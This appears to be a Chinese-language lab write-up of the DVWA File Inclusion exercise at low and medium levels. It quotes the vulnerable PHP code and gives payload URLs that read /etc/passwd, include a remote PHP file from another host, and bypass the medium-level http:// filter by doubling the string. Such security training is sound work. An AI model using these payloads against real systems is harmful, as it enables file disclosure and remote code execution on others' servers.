<center>File Inclusion文件包含</center>





[toc]







## File Inclusion文件包含

> 文件包含







### 1.low

> 低级
>
> 代码

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

> 本地文件 文件包含，看系统文件

```shell
# windows
http://192.168.0.111:8000/vulnerabilities/fi/?page=D:\\a.txt

# linux
http://192.168.0.111:8000/vulnerabilities/fi/?page=/etc/passwd
```

> 远程文件包含。 没有红色提示了。

```shell
php.ini allow_url_include 打开这个远程文件

# 进入docker环境
docker exec -it DockerId bash

# 修改php.ini
# 使用 sed 命令直接替换配置 查看php.ini路径
sudo sed -i 's/allow_url_include = Off/allow_url_include = On/g' /etc/php/7.0/apache2/php.ini

# 重启 Apache 服务
sudo systemctl restart apache2 / sudo service apache2 restart
```

```shell
# linux  两个主机之间可以通信。
http://192.168.0.111:8000/vulnerabilities/fi/?page=http://192.168.0.110:3000/a.php
```







### 2. medium

> 中级
>
> 代码

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

```shell
# 过滤了http https 我们直接多写几个 http://
http://192.168.0.111:8000/vulnerabilities/fi/?page=hhttp://ttp://192.168.0.110:3000/a.txt
```

> 防护：多过滤几次`http://`